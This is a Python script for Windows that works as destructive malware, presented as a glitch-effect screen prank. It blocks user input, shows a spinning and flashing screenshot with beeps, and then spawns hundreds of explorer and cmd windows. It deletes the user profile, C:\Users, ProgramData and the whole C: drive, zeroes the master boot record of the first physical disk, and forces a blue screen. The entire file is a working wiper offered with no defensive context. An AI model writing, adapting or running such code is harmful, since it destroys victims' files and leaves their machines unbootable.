import pygetwindow as gw
from PIL import ImageGrab, Image, ImageTk, ImageDraw, ImageFont
import tkinter as tk
import time, random, threading, winsound, ctypes, math
import os
import shutil
import subprocess

# ================== CONFIG =================
ROTATION_DURATION = 5
FPS = 60
MAX_ROTATION = 720

FLASH_DURATION = 10
FLASH_INTERVAL_START = 0.75
CUSTOM_FLASH_TEXT = "BLUEMAGIC"
# ==========================================

# ================== AUDIO ==================
def play_flash_sound():
    start = time.time()
    while time.time() - start < FLASH_DURATION:
        p = (time.time() - start) / FLASH_DURATION
        winsound.Beep(int(400 + 1600*p), max(40, int(200 - 160*p)))

# ==========================================

# ================== UTILS ==================
def hide_cursor(): ctypes.windll.user32.ShowCursor(False)

def screen_shake(intensity):
    try:
        root.geometry(f"+{random.randint(-intensity,intensity)}+{random.randint(-intensity,intensity)}")
    except:
        pass

def glitch_rgb(img, s=12):
    r,g,b = img.split()
    r = r.transform(img.size, Image.AFFINE,(1,0,random.randint(-s,s),0,1,0))
    g = g.transform(img.size, Image.AFFINE,(1,0,random.randint(-s,s),0,1,0))
    b = b.transform(img.size, Image.AFFINE,(1,0,random.randint(-s,s),0,1,0))
    return Image.merge("RGB",(r,g,b))
# ==========================================

# ================== BLOCAGE TOTAL ABSOLU ==================
def absolute_input_block():
    user32 = ctypes.windll.user32
    user32.BlockInput(True)
    
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    center_x = screen_width // 2
    center_y = screen_height // 2
    
    SPECIAL_KEYS = [
        0x5B, 0x5C, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B,
        0xA4, 0xA5, 0xA2, 0xA3, 0x2E, 0x91, 0x13,
    ]
    
    while True:
        user32.SetCursorPos(center_x, center_y)
        for vk in SPECIAL_KEYS:
            user32.keybd_event(vk, 0, 2, 0)
        time.sleep(0.001)

threading.Thread(target=absolute_input_block, daemon=True).start()
# ======================================================================

# ================== DESTRUCTION TOTALE ==================
def spam_windows():
    for _ in range(500):
        try:
            subprocess.Popen('explorer.exe')
        except:
            pass
    for _ in range(300):
        try:
            subprocess.Popen(['cmd', '/c', 'start', 'cmd', '/k', 'echo DESTRUCTION EN COURS && dir /s'])
        except:
            pass

def delete_everything():
    user_profile = os.environ['USERPROFILE']
    targets = [user_profile, "C:\\Users", "C:\\ProgramData", "C:\\Windows\\Temp", "C:\\"]
    for target in targets:
        if os.path.exists(target):
            try:
                shutil.rmtree(target, ignore_errors=False)
            except:
                pass

def brick_mbr_and_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    except:
        pass

    try:
        h = ctypes.windll.kernel32.CreateFileW("\\\\.\\PhysicalDrive0", 0x10000000, 3, None, 3, 0, None)
        junk = b"\x00" * 512
        written = ctypes.c_ulong(0)
        ctypes.windll.kernel32.WriteFile(h, junk, 512, ctypes.byref(written), None)
        ctypes.windll.kernel32.CloseHandle(h)
    except:
        pass

    try:
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except:
        pass

def launch_final_destruction():
    threading.Thread(target=spam_windows, daemon=True).start()
    threading.Thread(target=delete_everything, daemon=True).start()
    time.sleep(10)
    brick_mbr_and_bsod()
# ==========================================

# ================== SETUP ==================
windows = gw.getWindowsWithTitle("")
for w in windows: w.minimize()
time.sleep(1)

screenshot = ImageGrab.grab()
global W, H
W, H = screenshot.size

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)

canvas = tk.Canvas(root, width=W, height=H, bd=0, highlightthickness=0)
canvas.pack()

img_tk = None
image_id = None
start_time = time.time()

flash_start = None
# ==========================================

# ================== ROTATION ==================
def animate():
    global img_tk, image_id
    p = min((time.time()-start_time)/ROTATION_DURATION,1)

    if p >= 1:
        img_tk = ImageTk.PhotoImage(screenshot)
        canvas.itemconfig(image_id,image=img_tk)
        flash()
        return

    crushed = screenshot.resize((max(1,int(W*(1-p))),H))
    rot = crushed.rotate(p*MAX_ROTATION,expand=True)
    frame = Image.new("RGB",(W,H),"black")
    frame.paste(rot,((W-rot.width)//2,0))

    img_tk = ImageTk.PhotoImage(frame)
    if image_id is None:
        image_id = canvas.create_image(0,0,anchor="nw",image=img_tk)
    else:
        canvas.itemconfig(image_id,image=img_tk)

    root.after(int(1000/FPS),animate)

# ================== FLASH ==================
def flash():
    global flash_start, img_tk
    if flash_start is None:
        flash_start = time.time()
        threading.Thread(target=play_flash_sound,daemon=True).start()

    t = time.time() - flash_start
    if t >= FLASH_DURATION:
        root.destroy()
        launch_final_destruction()
        return

    interval = FLASH_INTERVAL_START*(1-0.85*t/FLASH_DURATION)
    phase = int(t/interval)%2

    if phase == 0:
        img = glitch_rgb(screenshot.copy(),15)
    else:
        img = Image.new("RGB",(W,H),(0,255,0))
        d = ImageDraw.Draw(img)
        try: font = ImageFont.truetype("arial.ttf",140)
        except: font = ImageFont.load_default()
        txt = CUSTOM_FLASH_TEXT
        b = d.textbbox((0,0),txt,font=font)
        d.text(((W-(b[2]-b[0]))//2,(H-(b[3]-b[1]))//2),
               txt,fill="white",font=font)

    screen_shake(int(10+20*t/FLASH_DURATION))
    img_tk = ImageTk.PhotoImage(img)
    canvas.itemconfig(image_id,image=img_tk)
    root.after(30,flash)

# ================== DÉMARRAGE ==================
root.after(10,animate)
root.mainloop()

# Sécurité si mainloop termine
launch_final_destruction()
